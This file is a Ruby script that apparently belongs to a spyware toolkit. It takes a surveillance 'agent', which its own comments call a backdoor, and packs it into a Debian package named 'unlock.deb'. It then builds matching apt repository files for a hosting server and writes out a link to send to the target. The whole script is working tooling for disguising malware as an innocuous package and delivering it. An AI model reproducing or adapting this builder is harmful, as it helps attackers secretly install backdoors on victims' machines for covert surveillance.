#!/usr/bin/env ruby

require 'archive/tar/minitar'
include Archive::Tar

require 'openssl'
require 'pp'
require 'zip'
require 'zip/filesystem'
require 'fileutils'

if __FILE__ == $0

  base_dir = File.realdirpath(File.dirname($0))

  # prepare the files
  agent = ARGV[0]
  url = ARGV[1]
  output = ARGV[2]
  output_server = ARGV[3]

  # sanity check on the parameters
  if ARGV.length < 4
    puts "Invalid argument count (#{ARGV.length} expected 4)"
    exit(1)
  end
  
  # check the the input exists
  unless File.exists?(agent)
    puts "Cannot find input agent (" + agent + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  unless File.size(agent) != 0
    puts "Invalid input agent (" + agent + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end
 
  FileUtils.cp "resources/control.tar.gz", "control.tar.gz"

  # create the tar for the backdoor
  # data.tar.gz -> /tmp/rcs/install.sh .....
  Zip::File.open(agent) do |z|
    z.each do |f|
      f_path = File.join('agent', f.name)
      FileUtils.mkdir_p(File.dirname(f_path))
      z.extract(f, f_path)
    end
  end
  FileUtils.rm_rf "data.tar.gz"
  fd = File.open('data.tar.gz', 'wb')
  sgz = Zlib::GzipWriter.new(fd)
  tar = Minitar::Output.new(sgz)

  Dir['agent/*'].each do |file|
    h = {name: file, as: "/tmp/unlock/" + File.basename(file)}
    Minitar::pack_file(h, tar)
  end
  tar.close

  # remove temporary directory
  FileUtils.rm_rf "agent"

  FileUtils.cp 'resources/debian-binary', '.'

  # create the final archive
  FileUtils.rm_rf "unlock.deb"
  ar = "ar"
  ar = "bin/ar.exe" if RbConfig::CONFIG['host_os'] =~ /mingw/
  system ar + " -q -c unlock.deb debian-binary control.tar.gz data.tar.gz"

  unless File.exists?('unlock.deb')
    puts "Cannot create deb archive"
    exit(1)
  end

  # compress the Packages
  packages = File.open("resources/Packages", 'rb') {|f| f.read}

  # recalculate MD5 and SIZE
  packages['[:MD5:]'] = Digest::MD5.hexdigest(File.binread('unlock.deb'))
  packages['[:SIZE:]'] = File.size('unlock.deb').to_s

  compressed = StringIO.open("", 'wb+')
  gzip = Zlib::GzipWriter.new(compressed)
  gzip.write packages
  gzip.close
  File.open('Packages.gz', 'wb+') {|f| f.write compressed.string}

  # file for user
  Zip::File.open(output, Zip::File::CREATE) do |z|
    z.file.open("link.txt", "wb") { |f| f.write "#{url}" }
  end

  # file for the http server
  Zip::File.open(output_server, Zip::File::CREATE) do |z|
    z.file.open("unlock.deb", "wb") { |f| f.write File.open('unlock.deb', 'rb') {|f| f.read} }
    z.file.open("Packages.gz", "wb") { |f| f.write File.open('Packages.gz', 'rb') {|f| f.read} }
    z.file.open("Release", "wb") { |f| f.write File.open('resources/Release', 'rb') {|f| f.read} }
  end

  # remove temporary files
  FileUtils.rm_rf "debian-binary"
  FileUtils.rm_rf "control.tar.gz"
  FileUtils.rm_rf "data.tar.gz"
  FileUtils.rm_rf "unlock.deb"
  FileUtils.rm_rf "Packages.gz"

end